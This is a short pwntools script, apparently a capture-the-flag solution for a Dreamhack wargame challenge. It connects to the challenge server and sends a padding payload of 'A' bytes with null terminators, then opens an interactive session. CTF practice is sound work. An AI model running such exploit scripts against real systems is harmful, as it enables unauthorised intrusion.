from pwn import *

p = remote("host2.dreamhack.games", 13781)
context.log_level = "debug"

payload = ""
payload += "A" * 0x39
payload += "\0"
payload += "A" * 0x39
payload += "\0"

p.sendafter("? ", payload)

p.interactive()